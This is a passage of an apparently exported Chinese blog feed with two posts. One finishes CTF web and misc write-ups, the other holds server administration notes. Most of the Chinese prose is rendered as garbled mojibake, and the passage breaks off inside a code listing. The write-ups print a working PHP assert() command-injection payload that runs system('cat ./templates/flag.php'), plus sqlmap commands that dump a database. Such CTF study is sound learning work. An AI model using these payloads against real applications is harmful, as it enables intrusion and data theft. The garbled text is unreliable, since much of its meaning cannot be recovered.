class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä¸Šæ„é€ å¥½çš„payload:<code>&#39;,&#39;yjn&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
<p>æŠŠæˆ‘ä»¬çš„payloadä»£å…¥è¿›å»:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"','yjn') or system('cat ./templates/flag.php');//"</span>;</span><br><span class="line">$file = templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php</span></span><br><span class="line"><span class="string">assert("strpos('</span>templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br></pre></td></tr></table></figure>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯, <code>//</code>åœ¨è¿™é‡Œèµ·åˆ°äº†æ³¨é‡Šçš„ä½œç”¨, ä½†æ˜¯åªæ³¨é‡Šåˆ°assertçš„æ‹¬å·å†….<br>æ‰€ä»¥è¿™æ¡è¯­å¥å°±æˆäº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"strpos('templates/','yjn') or system('cat ./templates/flag.php');"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>å†æŠŠ<code>assert()</code>å»é™¤æ‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="string">'templates/'</span>,<span class="string">'yjn'</span>) <span class="keyword">or</span> </span><br><span class="line">system(<span class="string">'cat ./templates/flag.php'</span>) <span class="keyword">or</span> </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ¡è¯­å¥ç”±ä¸‰ä¸ªå°è¯­å¥ç»„æˆ, å¹¶ç”¨<code>or</code>è¿æ¥äº†èµ·æ¥, ä¾æ­¤ç¼–å· 1 2 3.<br>é‚£ä¹ˆ, ä¸ºäº†å¾—åˆ°flag, æˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ<code>è¯­å¥2</code>,è€Œä¸å¸Œæœ›æ‰§è¡Œå…¶å®ƒè¯­å¥.<br>æ‰€ä»¥è¿™é‡Œå…¶å®æ˜¯åˆ©ç”¨äº†<code>or</code>çš„<code>çŸ­è·¯æ•ˆåº”</code>.</p>
<ul>
<li><code>è¯­å¥1</code> : <code>strpos()</code>å‡½æ•°ä¸ºæŸ¥æ‰¾å­—ä¸², ä½†æ˜¯æ˜¾ç„¶<code>templates/flag.php</code>ä¸­æ²¡æœ‰<code>yjn</code>è¿™ä¸ªå­ä¸², æ‰€ä»¥ä¼šæœ‰ä¸ªè¿”å›å€¼0. <code>or</code>ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œ.</li>
<li><code>è¯­å¥2</code> : ä½¿ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤<code>cat ./templates/flag.php</code>, è¿™æ¡å‘½ä»¤ä¸å…‰ä¼šè®©æˆ‘ä»¬æˆåŠŸçš„æ‹¿åˆ°äº†flag, è¿˜ä¼šè¿”å›<code>TRUE</code>, <code>or</code>å°±ä¸ä¼šæ‰§è¡Œ<code>è¯­å¥3</code>. å¦‚æœå‘½ä»¤æ‰§è¡Œä¸æˆåŠŸ, ä¹Ÿä¼šæœ‰ä¸ª<code>FLASE</code>çš„è¿”å›å€¼, è¿™æ›¾ä¸€åº¦ç»™æˆ‘å¾ˆå¤§çš„å›°æ‰°.</li>
</ul>
<p>æœ€ç»ˆ</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/mfw.png" alt title class>
                <p></p>
            </figure>

<h3 id="NewCenter-solved"><a href="#NewCenter-solved" class="headerlink" title="NewCenter(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686" target="_blank" rel="noopener">NewCenter(solved)</a></h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸ªç±»ä¼¼æ–°é—»ç½‘ç«™çš„é¡µé¢, ä¸‹é¢æœ‰ä¸ªæœç´¢æ¡†.<br>å¯ä»¥sqlæ³¨å…¥.<br>ä½†æ˜¯æˆ‘ç°åœ¨çš„sqlæ³¨å…¥æŠ€æœ¯è¿˜æ˜¯èœå•Š, æ‰€ä»¥å°±ç”¨<code>sqlmap</code>å§, è®°å½•ä¸‹~</p>
<p>å› ä¸º<code>sqlmap</code>è¦æ±‚<code>python2</code>è¿è¡Œ, æ‰€ä»¥æˆ‘è¿™é‡Œæ˜¯ç”¨çš„<code>Kali</code>ä¸‹è‡ªå¸¦çš„</p>
<p>é¦–å…ˆæŠŠæœç´¢çš„è¯·æ±‚åŒ…æŠ“å–, å°†å…¶å†…å®¹æ”¾è¿›ä¸€ä¸ª<code>txt</code>æ–‡ä»¶ä¸­</p>
<p>ä½¿ç”¨å‘½ä»¤<code>sqlmap   -r 1.txt --dbs</code><br>å¯ä»¥å°†è¡¨çš„åå­—åˆ—å‡º, å‘ç°æœ‰ä¸ª<code>news</code><br>å†ä½¿ç”¨å‘½ä»¤<code>sqlmap   -r 1.txt -D news --dump</code><br>å°±èƒ½å°†è¿™ä¸ªè¡¨çš„å†…å®¹å…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥<br>get flag~</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ext3-solved"><a href="#ext3-solved" class="headerlink" title="ext3(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5098" target="_blank" rel="noopener">ext3(solved)</a></h3><ul>
<li>é‡ç‚¹ :<ul>
<li>ext3 æ–‡ä»¶ç³»ç»Ÿ</li>
<li>strings</li>
<li>æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½/å¸è½½</li>
</ul>
</li>
</ul>
<p>é™„ä»¶æ˜¯ä¸ªåä¸º<code>linux</code>çš„æ–‡ä»¶,<br>æ‰”è¿› Linux é‡Œ,<code>file linux</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºæ˜¯Linuxæ–‡ä»¶ç³»ç»Ÿ<code>ext3</code>, æˆ‘ä»¬è¦æ‰¾çš„<code>flag</code>åº”è¯¥å°±è—åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# string linux | grep &apos;flag&apos;</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¦è¯»å–è¿™ä¸ª<code>flag.txt</code>,éœ€è¦æˆ‘ä»¬æŠŠæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°Linuxç³»ç»Ÿä¸‹.<br><code>mount linux /mnt</code><br>ç°åœ¨ <code>/mnt</code>ç›®å½•å°±æ˜¯æŒ‚è½½ç‚¹.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# cat /mnt/O7avZhikgKgbF/flag.txt</span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure>

<p><code>base64</code> decodeåå°±æ˜¯flag<br>æœ€åå¯ä»¥ä½¿ç”¨ <code>umount [æŒ‚è½½ç‚¹]</code>æ¥å¸è½½æ–‡ä»¶ç³»ç»Ÿ.</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æœåŠ¡å™¨è¿ç»´]]></title>
      <url>/2019/07/08/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/</url>
      <content type="html"><![CDATA[<h1 id="æœåŠ¡å™¨ç›¸å…³ç¬”è®°"><a href="#æœåŠ¡å™¨ç›¸å…³ç¬”è®°" class="headerlink" title="æœåŠ¡å™¨ç›¸å…³ç¬”è®°"></a>æœåŠ¡å™¨ç›¸å…³ç¬”è®°</h1><h2 id="æœåŠ¡å™¨å‚æ•°"><a href="#æœåŠ¡å™¨å‚æ•°" class="headerlink" title="æœåŠ¡å™¨å‚æ•°:"></a>æœåŠ¡å™¨å‚æ•°:</h2><ul>
<li>Ubunt 18.04 Server</li>
<li>å†…å­˜ 2GB</li>
</ul>
<h2 id="åŸºæœ¬å‘½ä»¤"><a href="#åŸºæœ¬å‘½ä»¤" class="headerlink" title="åŸºæœ¬å‘½ä»¤"></a>åŸºæœ¬å‘½ä»¤</h2><h3 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h3><p>æ–°å»ºæ–‡ä»¶ <code>touch &lt;name&gt;</code><br>åˆ é™¤æ–‡ä»¶ <code>rm   &lt;name&gt;</code><br>åˆ é™¤ç›®å½• <code>rm -r   &lt;name&gt;</code><br>è§£å‹ç¼© <code>unzip  &lt;name&gt;</code><br>æ–‡ä»¶å¤åˆ¶ <code>cp æºæ–‡ä»¶ ç›®æ ‡ç›®å½•</code><br>æ–‡ä»¶ç§»åŠ¨ <code>mv æºæ–‡ä»¶ ç›®æ ‡ç›®å½•</code></p>
<h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><p>ç¼–è¯‘C++ç¨‹åº(æŒ‡å®šåç§°å’Œåç¼€):<br><code>g++   *.cpp   -std=c++11 -o   a.exe</code></p>
<h3 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h3><p>è¿‡æ»¤å‡ºæ–‡ä»¶ä¸­åŒ…å« <code>key</code>çš„è®°å½• :<br><code>grep &#39;key&#39; &lt;file&gt;</code><br>é€’å½’è¿‡æ»¤ :<br><code>grep -r &#39;key&#39; &lt;file&gt;</code></p>
<h3 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h3><p>ä½œç”¨ ï¼šå°†ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥, æ“ä½œç¬¦æ˜¯ |</p>
<ol>
<li>å°† cat å’Œ grep ç»„åˆåœ¨ä¸€èµ·<br><code>cat &lt;file&gt; | grep &#39;key&#39;</code></li>
<li>è¿‡æ»¤å‡ºç›®å½•ä¸­åå­—åŒ…å«<code>key</code>çš„ç›®å½•(ä¸åŒ…å«å­ç›®å½•)<br><code>ls | grep &#39;key&#39;</code></li>
</ol>
<h3 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><ul>
<li>æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹<br><code>ps -A</code></li>
<li>æ€æ­»æŸé¡¹è¿›ç¨‹<br><code>sudo kill [è¿›ç¨‹ç¼–å·]</code></li>
</ul>
<h2 id="screenå‘½ä»¤"><a href="#screenå‘½ä»¤" class="headerlink" title="screenå‘½ä»¤"></a>screenå‘½ä»¤</h2><table>
<thead>
<tr>
<th align="center">å‘½ä»¤</th>
<th align="center">åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>screen -S &lt;name&gt;</code></td>
<td align="center">åˆ›å»ºåä¸º name çš„session</td>
</tr>
<tr>
<td align="center"><code>screen  -ls</code></td>
<td align="center">æ˜¾ç¤ºæ‰€æœ‰session</td>
</tr>
<tr>
<td align="center"><code>screen  -r  &lt;name&gt;</code></td>
<td align="center">è¿›å…¥åä¸º name çš„session</td>
</tr>
<tr>
<td align="center"><code>screen   -D  -r  &lt;name&gt;</code></td>
<td align="center">å°†åä¸ºnameçš„sessionç¦»çº¿å¹¶é‡æ–°è¿æ¥</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>ctrl+a     c</code></td>
<td align="center">åœ¨å½“å‰ç»ˆç«¯æ–°å»ºsession</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     w</code></td>
<td align="center">æ˜¾ç¤ºå½“å‰ç»ˆç«¯sessionåˆ—è¡¨</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     k</code></td>
<td align="center">å…³é—­å½“å‰session</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     0-9</code></td>
<td align="center">æ˜¾ç¤º0-9session</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     space</code></td>
<td align="center">æŒ‰ç…§é¡ºåºæ˜¾ç¤ºä¸‹ä¸€ä¸ªsession</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     A</code></td>
<td align="center">ä¸ºå½“å‰sessionå‘½å</td>
</tr>
<tr>
<td align="center">è‹¥è¦å…³é—­æŸä¸ªsessionï¼Œåˆ™å…³é—­è¯¥sessionä¸‹æ‰€æœ‰window</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><code>screen   -D  -r  &lt;name&gt;</code>å¯è§£å†³æŸäº›æƒ…å†µä¸‹æ— æ³•é‡è¿æ¥ç»ˆç«¯çš„é—®é¢˜</li>
<li>è‹¥è¦å…³é—­æŸä¸ªsessionï¼Œåˆ™å…³é—­è¯¥sessionä¸‹æ‰€æœ‰windowå³å¯</li>
</ul>
<h2 id="ä½¿ç”¨pscpä»æœ¬åœ°ä¸Šä¼ æ–‡ä»¶"><a href="#ä½¿ç”¨pscpä»æœ¬åœ°ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨pscpä»æœ¬åœ°ä¸Šä¼ æ–‡ä»¶"></a>ä½¿ç”¨pscpä»æœ¬åœ°ä¸Šä¼ æ–‡ä»¶</h2><blockquote>
<p>æ›´æ¨èä½¿ç”¨ finalShell ç±»çš„å·¥å…·,éå¸¸æ–¹ä¾¿,çœå»æ‰“å‘½ä»¤çš„æ—¶é—´,ä¸”æ›´ç›´è§‚</p>
</blockquote>
<p>æ­¥éª¤:</p>
<ol>
<li>ä»æœ¬åœ°æ‰“å¼€<code>CMD</code>åˆ°ï¼ˆpscpï¼‰puttyç›®å½•ä¸‹</li>
<li>pscp</li>
<li>åŸºæœ¬å‘½ä»¤æ ¼å¼ï¼š<br><code>pscp   [æœ¬åœ°æ–‡ä»¶è·¯å¾„]   [ç”¨æˆ·å]@[ServerIP]:[ç›®å½•]</code><br>æˆ–<code>pscp  -r   [æœ¬åœ°ç›®å½•è·¯å¾„]  [ç”¨æˆ·å]@[ServerIP]ï¼š[ç›®å½•]</code><br>åŒç†ï¼Œpscpä¹Ÿå¯ä»¥ä»Linuxå‘Windowså¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•</li>
</ol>
<h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><h4 id="é€šç”¨æ–¹æ³•"><a href="#é€šç”¨æ–¹æ³•" class="headerlink" title="é€šç”¨æ–¹æ³•:"></a>é€šç”¨æ–¹æ³•:</h4><ul>
<li>å¯åŠ¨:<code>/usr/local/apache2/bin/apachectl start apaceh</code></li>
<li>åœæ­¢:<code>/usr/local/apache2/bin/apachectl stop</code></li>
<li>é‡å¯:<code>/usr/local/apache2/bin/apachectl restart</code></li>
<li>é‡å¯ä½†ä¸ä¸­æ–­å½“å‰è¿æ¥:<code>/usr/local/sbin/apachectl graceful</code><h4 id="ä½œä¸ºLinuxçš„æœåŠ¡æ—¶"><a href="#ä½œä¸ºLinuxçš„æœåŠ¡æ—¶" class="headerlink" title="ä½œä¸ºLinuxçš„æœåŠ¡æ—¶:"></a>ä½œä¸ºLinuxçš„æœåŠ¡æ—¶:</h4></li>
<li>å¯åŠ¨: <code>service httpd start å¯åŠ¨</code></li>
<li>é‡æ–°å¯åŠ¨:<code>service httpd restart</code></li>
<li>åœæ­¢:<code>service httpd stop</code><h4 id="Ubuntuç³»ç»Ÿä¸‹"><a href="#Ubuntuç³»ç»Ÿä¸‹" class="headerlink" title="Ubuntuç³»ç»Ÿä¸‹:"></a>Ubuntuç³»ç»Ÿä¸‹:</h4></li>
<li>å¯åŠ¨: <code>$ sudo /etc/init.d/apache2 start</code></li>
<li>é‡æ–°å¯åŠ¨: <code>$ sudo /etc/init.d/apache2 restart</code></li>
<li>åœæ­¢: <code>$ sudo /etc/init.d/apache2 stop</code><h4 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ:"></a>å…¶å®ƒ:</h4>åœ¨é…ç½®å®Œæˆapache2.conf æ–‡ä»¶ä»¥è¾¾åˆ°ç¦æ­¢è®¿é—®ç›®å½•çš„ç›®çš„å, æˆ‘é‡æ–°å¯åŠ¨apache2æœåŠ¡, ä½†æ˜¯å´æ˜¾ç¤ºapache2.confæ–‡ä»¶è¯­æ³•é”™è¯¯<blockquote>
<p>Invalid Mutex directory in argument file:${APACHE_LOCK_DIR}</p>
</blockquote>
</li>
</ul>
<p>ç„¶è€Œè¿™é‡Œçš„éƒ¨åˆ†æˆ‘æ²¡æœ‰ä»»ä½•æ”¹åŠ¨.<br>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥é¿å…æŠ¥é”™, ç›´æ¥å¯åŠ¨<br><code>sudo apachectl restart</code><br>åŸç†è‡³ä»Šä¸æ˜.</p>
<h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p><code>/etc/apache2/apache2.conf</code></p>
<h2 id="MineCraftç›¸å…³å‘½ä»¤"><a href="#MineCraftç›¸å…³å‘½ä»¤" class="headerlink" title="MineCraftç›¸å…³å‘½ä»¤"></a>MineCraftç›¸å…³å‘½ä»¤</h2><ul>
<li><p>mine craftå¯åŠ¨å‘½ä»¤ï¼ˆå…¶ä»–jarç±»å‹çš„ç¨‹åºåº”è¯¥ä¹Ÿå¯ä»¥å¦‚æ­¤å¯åŠ¨ï¼‰<br><code>java -Xms# -Xmx# -jar [path]/minecraft_server.[version].jar nogui</code><br><code>nogui</code>:è¡¨ç¤ºä¸ä»¥å›¾å½¢ç•Œé¢è¿è¡Œ,å› ä¸ºæˆ‘çš„æœåŠ¡å™¨æ˜¯serverç‰ˆçš„,æœ¬èº«å°±æ²¡æœ‰å›¾å½¢ç•Œé¢,æ‰€ä»¥ä¸åŠ ä¹Ÿå¯ä»¥<br><code>-Xms</code>:åˆå§‹å¯åŠ¨åˆ†é…å†…å­˜<br><code>-Xmx</code>:æœ€å¤§åˆ†é…å†…å­˜<br><code>path</code>:jaråŒ…æ‰€åœ¨è·¯å¾„<br><code>version</code>:å½“å‰MineCraft_Serverç‰ˆæœ¬</p>
</li>
<li><p><code>tell &lt;sb&gt; &lt;something&gt;</code>: ç»™sb ç§ä¿¡ </p>
</li>
<li><p><code>gamemode survival &lt;sb&gt;</code>:å°† sb è°ƒè‡³ ç”Ÿå­˜æ¨¡å¼</p>
</li>
<li><p><code>gamemode create &lt;sb&gt;</code>:å°†sb è°ƒè‡³ åˆ›é€ æ¨¡å¼</p>
</li>
</ul>
<h2 id="tshark-ä½¿ç”¨"><a href="#tshark-ä½¿ç”¨" class="headerlink" title="tshark ä½¿ç”¨"></a>tshark ä½¿ç”¨</h2><p><strong>åŸºæœ¬æ¯ä¸ªå‘½ä»¤éƒ½éœ€è¦rootæƒé™<code>sudo</code></strong></p>
<ul>
<li>æ˜¾ç¤ºå¯ç”¨ç½‘å¡ <code>tshark -D</code></li>
<li>æŠ“åŒ…  ä½¿ç”¨å‘½ä»¤ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [æ•°å­—]  -w [æ–‡ä»¶å.pcap] -f [æ•è·è¿‡æ»¤å™¨]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c è¡¨ç¤ºæŠ“å¤šå°‘åŒ…ååœæ­¢</span><br><span class="line">+ -w æŠŠæŠ“åŒ…ç»“æœè¾“å…¥åˆ°æ–‡ä»¶ä¸­, æ— éœ€æå‰åˆ›å»º, è‹¥ç›®å½•ä¸‹æ²¡æœ‰, è‡ªåŠ¨åˆ›å»º</span><br><span class="line">+ -f è®¾ç½®æ•è·è¿‡æ»¤å™¨, æˆ‘ä»¬æ­¤å¤„ä¸»è¦é’ˆå¯¹httpçš„æ•°æ®åŒ…, æ‰€ä»¥å‚æ•°è®¾å®šä¸º &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯æ ¹æ®æˆ‘çš„è¯•éªŒ, å‡¡æ˜¯ä½¿ç”¨tsharkåäº§ç”Ÿçš„æ–‡ä»¶æƒé™éƒ½ååˆ†æ•æ„Ÿ, æ²¡æ³•ç”¨finalshell ç›´æ¥ä¸‹è½½, ä¸ºäº†æ–¹ä¾¿èµ·è§, å†è¡¥å……ä½¿ç”¨ `tcpdump` çš„æ–¹æ³•</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>tcpdump -s  [æ•°å­—]  -w [æ–‡ä»¶.pcap] port [ç«¯å£æ•°]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+ -s è¡¨ç¤ºä¸€ä¸ªåŒ…æˆªæ–­çš„é•¿åº¦, 0è¡¨ç¤ºä¸æˆªæ–­, å®Œæ•´çš„ä¿å­˜ä¸‹æ¥</span><br><span class="line">+ -w è¾“å…¥åˆ°æ–‡ä»¶</span><br><span class="line">+ port ç›‘å¬çš„ç«¯å£</span><br><span class="line"></span><br><span class="line">**ä½¿ç”¨ tcpdump åŒæ ·éœ€è¦sudo**</span><br><span class="line"></span><br><span class="line">## python è„šæœ¬</span><br><span class="line"></span><br><span class="line">### TCPå®¢æˆ·ç«¯</span><br><span class="line">```py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">target_host = &quot;188.131.227.20&quot;</span><br><span class="line">target_port =  9999   #ä¸æœåŠ¡ç«¯ä¿æŒä¸€è‡´</span><br><span class="line"></span><br><span class="line">#create a object named client</span><br><span class="line">client = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line">#connect server and client</span><br><span class="line">client.connect((target_host,target_port))</span><br><span class="line">#sent data to server</span><br><span class="line">client.send(&quot;hello world&quot;)</span><br><span class="line">#recevice data from server</span><br><span class="line">response = client.recv(4096)</span><br><span class="line"></span><br><span class="line">print response</span><br></pre></td></tr></table></figure>

<h3 id="TCPæœåŠ¡ç«¯"><a href="#TCPæœåŠ¡ç«¯" class="headerlink" title="TCPæœåŠ¡ç«¯"></a>TCPæœåŠ¡ç«¯</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bind_ip = <span class="string">"0.0.0.0"</span></span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">server.bind((bind_ip , bind_port))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Listening on %s:%d"</span> % (bind_ip , bind_port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">( client_socket )</span>:</span></span><br><span class="line">    request = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Received: %s"</span> % request</span><br><span class="line">    </span><br><span class="line">    client_socket.send(<span class="string">"ACK!"</span>)</span><br><span class="line">    </span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client , addr = server.accept()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Accepted connection from: %s:%d"</span> % (addr[<span class="number">0</span>] , addr[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    client_handler = threading.Thread(target=handle_client , args=(client, ))</span><br><span class="line">    </span><br><span class="line">    client_handler.start()</span><br></pre></td></tr></table></figure>

<h3 id="ä»¿-netcat-çš„è„šæœ¬å·¥å…·-â€”-BHP-Net-Tool"><a href="#ä»¿-netcat-çš„è„šæœ¬å·¥å…·-â€”-BHP-Net-Tool" class="headerlink" title="ä»¿ netcat çš„è„šæœ¬å·¥å…· â€” BHP Net Tool"></a>ä»¿ netcat çš„è„šæœ¬å·¥å…· â€” BHP Net Tool</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 